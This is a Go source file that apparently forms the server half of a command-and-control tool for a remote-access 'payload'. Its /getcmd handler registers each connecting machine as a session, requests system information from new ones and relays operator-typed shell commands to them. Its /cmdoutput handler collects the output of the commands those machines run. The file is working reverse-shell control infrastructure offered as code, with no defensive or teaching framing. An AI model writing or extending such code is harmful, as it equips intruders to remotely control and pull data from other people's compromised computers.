package server

import (
	"fmt"
	"io/ioutil"
	"net/http"

	"github.com/i582/cfmt/cmd/cfmt"
)

// GetCmd handles the /getcmd endpoint and requests a
// cmd from stdin to send to the payload
func GetCmd(w http.ResponseWriter, req *http.Request) {
	if req.Method == http.MethodGet {
		token := req.Header.Get("token")
		ip := GetIP(req)

		index, isNew := CreateSession(token, ip)

		sessionObj, _ := GetSession(index)

		if isNew {
			cli.Print(cfmt.Sprintf("{{[+] New connection from %s with session id: %d\n}}::green", ip, index))
			// if the session is new, get the system information
			fmt.Fprint(w, "__sysinfo__")
		} else {
			cli.Printf("[+] Got request for cmd from session id: %d\n", index)

			// Set session as open
			sessionObj.Open = true

			var command string

			for {
				select {
				case str := <-sessionObj.Cmd:
					command = str
					fmt.Fprintf(w, command)
				case <-req.Context().Done():
					cli.Print(cfmt.Sprintf("{{[-] Connection closed from session: %d\n}}::red", index))
					sessionObj.Open = false
					w.WriteHeader(444) // 444 - Connection Closed Without Response
				}
				break
			}

			if command == "quit" {
				sessionObj.Open = false
				cli.Printf("[+] Session %d quit.\n", index)
			}
		}
	}
}

// CmdOutput handles the /cmdoutput endpoint and retrieves
// the output of a cmd executed by the payload
func CmdOutput(w http.ResponseWriter, req *http.Request) {
	if req.Method == http.MethodPost {
		body, err := ioutil.ReadAll(req.Body)
		defer req.Body.Close()
		if err != nil {
			cli.Print(cfmt.Sprintf("{{[-] Got error:\n%s\n}}::red", err))
			return
		}

		index := FindSessionIndexByToken(req.Header.Get("Token"))

		// close connection, the client will open a new one
		w.Header().Set("Connection", "close")
		cli.Printf("[+] Got response from session id %d:\n%s\n", index, body)
		fmt.Fprintf(w, "Successfully posted output")
	}
}
